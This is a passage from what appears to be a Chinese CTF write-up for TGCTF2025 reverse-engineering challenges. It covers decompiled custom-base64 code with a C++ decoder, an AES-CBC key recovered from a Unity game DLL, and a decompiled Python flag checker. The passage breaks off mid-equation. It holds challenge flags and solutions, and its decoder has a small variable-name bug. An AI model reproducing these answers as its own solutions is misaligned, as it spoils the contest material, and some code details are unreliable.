__int8 *)(v10 - <span class="number">2</span>) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      v10 += <span class="number">3</span>;</span><br><span class="line">      v13 = v12 + <span class="number">24</span>;</span><br><span class="line">      v14 = v13 - <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v13 &lt;= <span class="number">0x40</span> )</span><br><span class="line">        v14 = v13;</span><br><span class="line">      v9[v3 - <span class="number">4</span>] = v30[v14];</span><br><span class="line">      v15 = ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">4</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v10 - <span class="number">5</span>) &amp; <span class="number">3</span>))) - <span class="number">40</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">4</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v10 - <span class="number">5</span>) &amp; <span class="number">3u</span>))) + <span class="number">24</span> &lt;= <span class="number">0x40</span> )</span><br><span class="line">        v15 = ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">4</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v10 - <span class="number">5</span>) &amp; <span class="number">3</span>))) + <span class="number">24</span>;</span><br><span class="line">      v9[v3 - <span class="number">3</span>] = v30[v15];</span><br><span class="line">      v16 = ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">3</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (*(_BYTE *)(v10 - <span class="number">4</span>) &amp; <span class="number">0xF</span>))) - <span class="number">40</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">3</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (*(_BYTE *)(v10 - <span class="number">4</span>) &amp; <span class="number">0xFu</span>))) + <span class="number">24</span> &lt;= <span class="number">0x40</span> )</span><br><span class="line">        v16 = ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">3</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (*(_BYTE *)(v10 - <span class="number">4</span>) &amp; <span class="number">0xF</span>))) + <span class="number">24</span>;</span><br><span class="line">      v9[v3 - <span class="number">2</span>] = v30[v16];</span><br><span class="line">      v17 = (*(_BYTE *)(v10 - <span class="number">3</span>) &amp; <span class="number">0x3F</span>) - <span class="number">40</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (*(_BYTE *)(v10 - <span class="number">3</span>) &amp; <span class="number">0x3Fu</span>) + <span class="number">24</span> &lt;= <span class="number">0x40</span> )</span><br><span class="line">        v17 = (*(_BYTE *)(v10 - <span class="number">3</span>) &amp; <span class="number">0x3F</span>) + <span class="number">24</span>;</span><br><span class="line">      v9[v3 - <span class="number">1</span>] = v30[v17];</span><br><span class="line">      --v11;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 );</span><br><span class="line">  &#125;</span><br><span class="line">  v18 = v5 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v18 )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = (*(<span class="type">unsigned</span> __int8 *)((<span class="type">int</span>)v2 + a1 - <span class="number">1</span>) &gt;&gt; <span class="number">2</span>) - <span class="number">40</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (*(<span class="type">unsigned</span> __int8 *)((<span class="type">int</span>)v2 + a1 - <span class="number">1</span>) &gt;&gt; <span class="number">2</span>) + <span class="number">24</span> &lt;= <span class="number">0x40u</span> )</span><br><span class="line">      v25 = (*(<span class="type">unsigned</span> __int8 *)((<span class="type">int</span>)v2 + a1 - <span class="number">1</span>) &gt;&gt; <span class="number">2</span>) + <span class="number">24</span>;</span><br><span class="line">    v9[v7 - <span class="number">4</span>] = v30[v25];</span><br><span class="line">    v26 = *(_BYTE *)((<span class="type">int</span>)v2 + a1 - <span class="number">1</span>) &amp; <span class="number">3</span>;</span><br><span class="line">    *(_WORD *)&amp;v9[v7 - <span class="number">2</span>] = <span class="number">15677</span>;</span><br><span class="line">    v27 = <span class="number">16</span> * v26 + <span class="number">24</span>;</span><br><span class="line">    v28 = v27 - <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v27 &lt;= <span class="number">0x40</span> )</span><br><span class="line">      v28 = v27;</span><br><span class="line">    v9[v7 - <span class="number">3</span>] = v30[v28];</span><br><span class="line">    <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v18 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_37:</span><br><span class="line">    v9[v7] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> v9;</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = a1 + (<span class="type">int</span>)v2;</span><br><span class="line">  v20 = (*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">2</span>) &gt;&gt; <span class="number">2</span>) - <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">2</span>) &gt;&gt; <span class="number">2</span>) + <span class="number">24</span> &lt;= <span class="number">0x40u</span> )</span><br><span class="line">    v20 = (*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">2</span>) &gt;&gt; <span class="number">2</span>) + <span class="number">24</span>;</span><br><span class="line">  v9[v7 - <span class="number">4</span>] = v30[v20];</span><br><span class="line">  v21 = ((*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v19 - <span class="number">2</span>) &amp; <span class="number">3</span>))) - <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ((*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v19 - <span class="number">2</span>) &amp; <span class="number">3u</span>))) + <span class="number">24</span> &lt;= <span class="number">0x40</span> )</span><br><span class="line">    v21 = ((*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v19 - <span class="number">2</span>) &amp; <span class="number">3</span>))) + <span class="number">24</span>;</span><br><span class="line">  v9[v7 - <span class="number">3</span>] = v30[v21];</span><br><span class="line">  v22 = *(_BYTE *)(v19 - <span class="number">1</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  *(_WORD *)&amp;v9[v7 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  v23 = <span class="number">4</span> * v22 + <span class="number">24</span>;</span><br><span class="line">  v24 = <span class="number">4</span> * v22 - <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v23 &lt;= <span class="number">0x40</span> )</span><br><span class="line">    v24 = v23;</span><br><span class="line">  v9[v7 - <span class="number">2</span>] = v30[v24];</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">base64_decode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_input_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *base64_table = <span class="string">&quot;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> reverse_table[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        reverse_table[(<span class="type">unsigned</span> <span class="type">char</span>)base64_table[i]] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> input_len = <span class="built_in">strlen</span>(_input_);</span><br><span class="line">    <span class="type">size_t</span> padding = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input_len &gt; <span class="number">0</span> &amp;&amp; _input_[input_len - <span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        padding++;</span><br><span class="line">        <span class="keyword">if</span> (input_len &gt; <span class="number">1</span> &amp;&amp; _input_[input_len - <span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            padding++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> output_len = (input_len * <span class="number">3</span>) / <span class="number">4</span> - padding;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *output = (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(output_len + <span class="number">1</span>);</span><br><span class="line">    output[output_len] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; input_len - padding)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> b1, b2, b3, b4;</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> v1 = reverse_table[_input_[i++]];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> v2 = reverse_table[_input_[i++]];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> v3 = (i &lt; input_len) ? reverse_table[_input_[i++]] : <span class="number">0</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> v4 = (i &lt; input_len) ? reverse_table[_input_[i++]] : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        b1 = (v1 &gt; <span class="number">24</span>) ? (v1 - <span class="number">24</span>) : (v1 + <span class="number">64</span> - <span class="number">24</span>);</span><br><span class="line">        b2 = (v2 &gt; <span class="number">24</span>) ? (v2 - <span class="number">24</span>) : (v2 + <span class="number">64</span> - <span class="number">24</span>);</span><br><span class="line">        b3 = (v3 &gt; <span class="number">24</span>) ? (v3 - <span class="number">24</span>) : (v3 + <span class="number">64</span> - <span class="number">24</span>);</span><br><span class="line">        b4 = (v4 &gt; <span class="number">24</span>) ? (v4 - <span class="number">24</span>) : (v4 + <span class="number">64</span> - <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (j &lt; output_len)</span><br><span class="line">            output[j++] = (b1 &lt;&lt; <span class="number">2</span>) | (b2 &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span> (j &lt; output_len)</span><br><span class="line">            output[j++] = (b2 &lt;&lt; <span class="number">4</span>) | (b3 &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (j &lt; output_len)</span><br><span class="line">            output[j++] = (b3 &lt;&lt; <span class="number">6</span>) | b4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">char</span> *)output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *Enc= <span class="string">&quot;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *Decoded= <span class="built_in">base64_decode</span>(Enc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, Decoded);</span><br><span class="line">    <span class="built_in">free</span>(decoded);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{ad162c-2d94-434d-9222-b65dc76a32}</p><h2 id="水果忍者"><a href="#水果忍者" class="headerlink" title="水果忍者"></a>水果忍者</h2><p>主要 dll 目录：\水果忍者\Fruit Ninja_Data\Managed\Assembly-CSharp.dll</p><p>拖入 dnSpy 分析，是 AES CBC 加密。</p><p><img src="/2025/04/13/TGCTF2025/SkHubyVDToXzQ5x3DFBcF7PQntf.png"></p><p>底下有密文、密钥、iv，直接解密即可。</p><p><img src="/2025/04/13/TGCTF2025/E150bPmfNoFuhzxZfGqcRtBunkd.png"></p><p><img src="/2025/04/13/TGCTF2025/IOlAbPLIwomQLFxru43cw9Ubn0e.png"></p><p>HZNUCTF{de20-70dd-4e62-b8d0-06e}</p><h2 id="蛇年的本命语言"><a href="#蛇年的本命语言" class="headerlink" title="蛇年的本命语言"></a>蛇年的本命语言</h2><p>python 程序解包得到 pyc（python 3.8），使用 uncompyle6 解密得到代码。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">from collections <span class="keyword">import</span> Counter</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&quot;Welcome to HZNUCTF!!!&quot;</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&quot;Plz input the flag:&quot;</span>)</span></span></span><br><span class="line"><span class="function">ooo0oOoooOOO0 </span>= <span class="built_in">input</span>()</span><br><span class="line">oOO0OoOoo000 = <span class="built_in">Counter</span>(ooo0oOoooOOO0)</span><br><span class="line">O0o00 = <span class="string">&quot;&quot;</span>.<span class="built_in">join</span>((<span class="built_in">str</span>(oOO0OoOoo000[oOooo0OOO]) <span class="keyword">for</span> oOooo0OOO in ooo0oOoooOOO0))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ans1: &quot;</span>, _end_=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(O0o00)</span><br><span class="line"><span class="keyword">if</span> O0o00 != <span class="string">&quot;111111116257645365477364777645752361&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wrong_wrong!!!&quot;</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>)</span><br><span class="line">iiIII = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> oOooo0OOO in ooo0oOoooOOO0:</span><br><span class="line">    <span class="keyword">if</span> oOO0OoOoo000[oOooo0OOO] &gt; <span class="number">0</span>:</span><br><span class="line">        iiIII += oOooo0OOO + <span class="built_in">str</span>(oOO0OoOoo000[oOooo0OOO])</span><br><span class="line">        oOO0OoOoo000[oOooo0OOO] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i11i1Iii1I1 = [<span class="built_in">ord</span>(oOooo0OOO) <span class="keyword">for</span> oOooo0OOO in iiIII]</span><br><span class="line">        ii1iIi1i11i = [</span><br><span class="line">         <span class="number">7</span> * i11i1Iii1I1[<span class="number">0</span>] == <span class="number">504</span>,</span><br><span class="line">         <span class="number">9</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">5</span> * i11i1Iii1I1[<span class="number">1</span>] == <span class="number">403</span>,</span><br><span class="line">         <span class="number">2</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">5</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">2</span>] == <span class="number">799</span>,</span><br><span class="line">         <span class="number">3</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">8</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">3</span>] == <span class="number">2938</span>,</span><br><span class="line">         <span class="number">5</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">19</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">4</span>] == <span class="number">2042</span>,</span><br><span class="line">         <span class="number">7</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">5</span> * i11i1Iii1I1[<span class="number">5</span>] == <span class="number">1225</span>,</span><br><span class="line">         <span class="number">11</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">33</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">44</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">77</span> * i11i1Iii1I1[<span class="number">6</span>] == <span class="number">7975</span>,</span><br><span class="line">         <span class="number">21</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">24</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">7</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">7</span>] == <span class="number">229</span>,</span><br><span class="line">         <span class="number">2</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">65</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">8</span>] == <span class="number">2107</span>,</span><br><span class="line">         <span class="number">10</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">-9</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">22</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">30</span> * i11i1Iii1I1[<span class="number">9</span>] == <span class="number">4037</span>,</span><br><span class="line">         <span class="number">15</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">59</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">56</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">122</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">32</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>] == <span class="number">4950</span>,</span><br><span class="line">         <span class="number">13</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">39</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">33</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">42</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">62</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">11</span> * i11i1Iii1I1[<span class="number">11</span>] == <span class="number">12544</span>,</span><br><span class="line">         <span class="number">23</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">63</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">25</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">32</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">11</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>] == <span class="number">6585</span>,</span><br><span class="line">         <span class="number">223</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">53</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">65</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">13</span>] == <span class="number">6893</span>,</span><br><span class="line">         <span class="number">29</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">9</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">93</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">33</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">96</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">68</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">33</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">14</span> * i11i1Iii1I1[<span class="number">14</span>] == <span class="number">1883</span>,</span><br><span class="line">         <span class="number">69</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">77</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">93</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">19</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">8</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">38</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">15</span>] == <span class="number">8257</span>,</span><br><span class="line">         <span class="number">23</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">12</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">24</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">14</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">68</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">68</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">15</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">16</span>] == <span 